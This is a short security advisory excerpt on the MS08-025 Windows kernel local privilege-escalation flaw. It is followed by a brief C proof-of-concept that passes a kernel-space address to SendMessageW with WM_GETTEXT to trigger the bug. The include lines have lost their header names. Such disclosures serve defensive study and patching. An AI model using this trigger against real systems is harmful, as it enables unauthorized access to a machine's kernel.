source: http://www.securityfocus.com/bid/28554/info

Microsoft Windows is prone to a local privilege-escalation vulnerability.

The vulnerability resides in the Windows kernel. A locally logged-in user can exploit this issue to gain kernel-level access to the operating system.

#include 
#include 

int main(int argc,char *argv[])
{
    DWORD    dwHookAddress = 0x80000000;

    printf( "\tMS08-025 Local Privilege Escalation Vulnerability Exploit(POC)\n\n" );
        printf( "Create by Whitecell's Polymorphours@whitecell.org 2008/04/10\n" );

    SendMessageW( GetDesktopWindow(), WM_GETTEXT, 0x80000000, dwHookAddress );
    return 0;
}
